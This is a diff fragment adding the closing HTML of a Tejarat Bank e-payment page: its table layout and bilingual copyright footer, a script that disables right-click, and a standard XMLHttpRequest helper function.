+                                <td width="23" background="/epay/images/Main_right_C.gif">&nbsp;</td>
+                                <td width="5">&nbsp;</td>
+                            </tr>
+                            <tr>
+                                <td width="23"><img src="/epay/images/Main_buttom_l.gif" width="23" height="20"/></td>
+                                <td background="/epay/images/Main_buttom_c.gif">&nbsp;</td>
+                                <td width="23"><img src="/epay/images/Main_buttom_r.gif" width="22" height="20"/></td>
+                                <td width="5">&nbsp;</td>
+                            </tr>
+                        </table>
+                    </td>
+
+                </tr>
+            </table>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <table width="935" border="0" cellspacing="0" cellpadding="0">
+                <tr>
+                    <td width="20"><img src="/epay/images/footer_left.jpg" width="20" height="73"/></td>
+                    <td background="/epay/images/footer_center.jpg">
+                        <div align="center" style="line-height:22px;">
+                            <span lang="fa" xml:lang="fa" class="style2">تمامی حقوق متعلق به این سایت برای بانک تجارت محفوظ است</span><br
+                                class="style2"/>
+        	<span class="style1"><span class="style3">Copyright © 2013 Tejarat                              Bank, All Right Reserved.   Powered and Designed by
+			</span> <a target="_blank" href="http://www.sabapardazesh.com/">
+                <span class="style3">SabaPardazesh Inc</span></a></span><br class="style2"/>
+                        </div>
+                    </td>
+                    <td width="20"><img src="/epay/images/footer_right.jpg" width="20" height="73"/></td>
+                </tr>
+            </table>
+        </td>
+    </tr>
+</table-->
+<script language="JavaScript">
+    <!--
+    var message = "";
+    function clickIE() {
+        if (document.all) {
+            (message);
+            return false;
+        }
+    }
+    function clickNS(e) {
+        if
+                (document.layers || (document.getElementById && !document.all)) {
+            if (e.which == 2 || e.which == 3) {
+                (message);
+                return false;
+            }
+        }
+    }
+    if (document.layers)
+    {
+        document.captureEvents(Event.MOUSEDOWN);
+        document.onmousedown = clickNS;
+    }
+    else {
+        document.onmouseup = clickNS;
+        document.oncontextmenu = clickIE;
+    }
+
+    document.oncontextmenu = new Function("return false")
+    // -->
+</script>
+<script language="JavaScript" type="text/javascript">
+    function getXMLHttpRequestObject() {
+        var xmlhttp;
+        /*@cc_on
+         @if (@_jscript_version >= 5)
+         try {
+         xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
+         } catch (e) {
+         try {
+         xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+         } catch (E) {
+         xmlhttp = false;
+         }
+         }
+         @else
+         xmlhttp = false;
+         @end @*/
+        if (!xmlhttp && typeof XMLHttpRequest != 'undefined') {
+            try {
+                xmlhttp = new XMLHttpRequest();
+            } catch (e) {
+                xmlhttp = false;
+            }
+        }
+        return xmlhttp;
+    }
+</script>
+
+</body></html>
